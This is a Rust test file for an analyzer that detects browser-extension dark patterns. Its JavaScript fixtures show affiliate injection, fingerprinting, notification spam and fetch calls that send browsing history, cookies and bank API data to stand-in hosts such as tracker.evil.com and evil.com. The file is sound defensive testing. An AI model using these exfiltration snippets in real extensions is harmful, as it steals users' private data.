use extanalyzer::analyze::dark_patterns::analyze_dark_patterns;
use extanalyzer::analyze::javascript::analyze_javascript;
use extanalyzer::models::{Category, DarkPatternType, DataSource};
use std::path::Path;

#[test]
fn test_full_dark_pattern_detection() {
    let code = r#"
        // Affiliate injection
        document.querySelectorAll('a[href*="amazon.com"]').forEach(link => {
            link.href = link.href + '?tag=myaffiliate-20';
        });

        // Data exfiltration - history and cookies sent to external server
        let history = await chrome.history.search({ text: '' });
        let cookies = document.cookie;
        fetch('https://tracker.evil.com/collect', {
            method: 'POST',
            body: JSON.stringify(history)
        });
        fetch('https://tracker.evil.com/cookies', {
            method: 'POST',
            body: cookies
        });

        // Cross-domain network data exfiltration (triggers DataExfiltration finding)
        let bankData = await fetch('https://bank.com/api/accounts');
        let parsed = await bankData.json();
        fetch('https://tracker.evil.com/exfil', {
            method: 'POST',
            body: JSON.stringify(parsed)
        });

        // Review nagging
        chrome.runtime.setUninstallURL('https://chrome.google.com/webstore/detail/myext/reviews');
    "#;

    // Run both analyzers (like the full analysis pipeline does)
    let (js_findings, endpoints) = analyze_javascript(code, Path::new("evil.js"));
    let dp_findings = analyze_dark_patterns(code, Path::new("evil.js"));

    // Combine findings like the real analyzer does
    let all_findings: Vec<_> = js_findings.iter().chain(dp_findings.iter()).collect();

    // Check for affiliate injection finding (detected by dark_patterns.rs via regex)
    assert!(
        all_findings.iter().any(|f| matches!(
            &f.category,
            Category::DarkPattern(DarkPatternType::AffiliateInjection)
        )),
        "Should detect affiliate injection"
    );

    // Check for review nagging (detected by dark_patterns.rs via regex)
    assert!(
        all_findings.iter().any(|f| matches!(
            &f.category,
            Category::DarkPattern(DarkPatternType::ReviewNagging)
        )),
        "Should detect review nagging"
    );

    // Check for data exfiltration (detected by javascript.rs cross-domain check)
    assert!(
        all_findings.iter().any(|f| matches!(
            &f.category,
            Category::DarkPattern(DarkPatternType::DataExfiltration)
        )),
        "Should detect data exfiltration"
    );

    // Check endpoints exist for the tracker - look for any evil.com endpoint with data sources
    let evil_endpoints: Vec<_> = endpoints
        .iter()
        .filter(|e| e.url.contains("evil.com") && !e.data_sources.is_empty())
        .collect();

    assert!(
        !evil_endpoints.is_empty(),
        "Should find evil.com endpoints with data sources"
    );

    // Verify at least one endpoint has BrowsingHistory as a data source
    assert!(
        evil_endpoints.iter().any(|e| {
            e.data_sources
                .iter()
                .any(|s| matches!(s, DataSource::BrowsingHistory))
        }),
        "Should track BrowsingHistory as data source"
    );

    // Verify at least one endpoint has Cookie as a data source
    assert!(
        evil_endpoints.iter().any(|e| {
            e.data_sources
                .iter()
                .any(|s| matches!(s, DataSource::Cookie(_)))
        }),
        "Should track Cookie as data source"
    );
}

#[test]
fn test_affiliate_injection_detection() {
    let code = r#"
        // Various affiliate parameter patterns
        element.href = url + "?ref=affiliate123";
        link.href = baseUrl + "&affiliate=partner456";
        anchor.href = site + "?tag=mytag-20";
    "#;

    let findings = analyze_dark_patterns(code, Path::new("affiliate.js"));

    // Should detect at least one affiliate injection
    let affiliate_findings: Vec<_> = findings
        .iter()
        .filter(|f| {
            matches!(
                &f.category,
                Category::DarkPattern(DarkPatternType::AffiliateInjection)
            )
        })
        .collect();

    assert!(
        !affiliate_findings.is_empty(),
        "Should detect affiliate injection patterns"
    );
}

#[test]
fn test_review_nagging_detection() {
    let code = r#"
        chrome.runtime.setUninstallURL("https://chrome.google.com/webstore/detail/myext/reviews");
    "#;

    let findings = analyze_dark_patterns(code, Path::new("nag.js"));

    assert!(
        findings.iter().any(|f| matches!(
            &f.category,
            Category::DarkPattern(DarkPatternType::ReviewNagging)
        )),
        "Should detect review nagging"
    );
}

#[test]
fn test_fingerprinting_detection() {
    // Canvas fingerprinting
    let canvas_code = r#"
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.fillText('test', 0, 0);
        const data = canvas.toDataURL();
    "#;

    let findings = analyze_dark_patterns(canvas_code, Path::new("fingerprint.js"));

    assert!(
        findings.iter().any(|f| matches!(
            &f.category,
            Category::DarkPattern(DarkPatternType::Fingerprinting)
        )),
        "Should detect canvas fingerprinting"
    );

    // WebGL fingerprinting
    let webgl_code = r#"
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        const renderer = gl.getParameter(gl.RENDERER);
    "#;

    let findings = analyze_dark_patterns(webgl_code, Path::new("webgl.js"));

    assert!(
        findings.iter().any(|f| matches!(
            &f.category,
            Category::DarkPattern(DarkPatternType::Fingerprinting)
        )),
        "Should detect WebGL fingerprinting"
    );
}

#[test]
fn test_notification_spam_detection() {
    let code = r#"
        setInterval(() => {
            chrome.notifications.create("alert", {
                title: "Check this out!"
            });
        }, 60000);
    "#;

    let findings = analyze_dark_patterns(code, Path::new("spam.js"));

    assert!(
        findings.iter().any(|f| matches!(
            &f.category,
            Category::DarkPattern(DarkPatternType::NotificationSpam)
        )),
        "Should detect notification spam"
    );
}

#[test]
fn test_cross_domain_data_exfiltration() {
    // This tests the javascript.rs analyzer's cross-domain detection
    let code = r#"
        let response = await fetch('https://bank.com/api/accounts');
        let data = await response.json();
        fetch('https://evil.com/steal', { body: JSON.stringify(data) });
    "#;

    let (findings, endpoints) = analyze_javascript(code, Path::new("exfil.js"));

    // Should detect cross-domain data exfiltration
    assert!(
        findings.iter().any(|f| matches!(
            &f.category,
            Category::DarkPattern(DarkPatternType::DataExfiltration)
        )),
        "Should detect data exfiltration via cross-domain transfer"
    );

    // Verify the endpoint has the cross-domain flag
    let evil_endpoint = endpoints
        .iter()
        .find(|e| e.url.contains("evil.com") && !e.data_sources.is_empty())
        .expect("Should find evil.com endpoint with data sources");

    assert!(
        evil_endpoint.flags.iter().any(|f| matches!(
            f,
            extanalyzer::models::EndpointFlag::CrossDomainTransfer { .. }
        )),
        "Should have CrossDomainTransfer flag"
    );
}

#[test]
fn test_dark_pattern_type_categories() {
    // Test that dark pattern types are correctly categorized
    assert_eq!(
        DarkPatternType::AffiliateInjection.category_name(),
        "Monetization"
    );
    assert_eq!(DarkPatternType::AdInjection.category_name(), "Monetization");
    assert_eq!(
        DarkPatternType::SearchHijacking.category_name(),
        "Monetization"
    );

    assert_eq!(DarkPatternType::HiddenTracking.category_name(), "Privacy");
    assert_eq!(
        DarkPatternType::ExcessiveCollection.category_name(),
        "Privacy"
    );
    assert_eq!(DarkPatternType::Fingerprinting.category_name(), "Privacy");
    assert_eq!(DarkPatternType::DataExfiltration.category_name(), "Privacy");

    assert_eq!(
        DarkPatternType::ReviewNagging.category_name(),
        "Manipulation"
    );
    assert_eq!(
        DarkPatternType::NotificationSpam.category_name(),
        "Manipulation"
    );
    assert_eq!(DarkPatternType::FakeUrgency.category_name(), "Manipulation");
    assert_eq!(DarkPatternType::DisguisedAds.category_name(), "Manipulation");

    assert_eq!(
        DarkPatternType::PermissionCreep.category_name(),
        "Bait-and-Switch"
    );
    assert_eq!(
        DarkPatternType::HiddenFunctionality.category_name(),
        "Bait-and-Switch"
    );
    assert_eq!(
        DarkPatternType::MisleadingDescription.category_name(),
        "Bait-and-Switch"
    );
}

#[test]
fn test_no_false_positives_for_clean_code() {
    let clean_code = r#"
        function greet(name) {
            console.log("Hello, " + name);
        }
        greet("World");
    "#;

    let dp_findings = analyze_dark_patterns(clean_code, Path::new("clean.js"));
    let (js_findings, _) = analyze_javascript(clean_code, Path::new("clean.js"));

    // Filter for only dark pattern findings from js_findings
    let js_dark_patterns: Vec<_> = js_findings
        .iter()
        .filter(|f| matches!(&f.category, Category::DarkPattern(_)))
        .collect();

    assert!(
        dp_findings.is_empty(),
        "Clean code should not trigger dark pattern detection"
    );
    assert!(
        js_dark_patterns.is_empty(),
        "Clean code should not trigger JS analyzer dark pattern detection"
    );
}
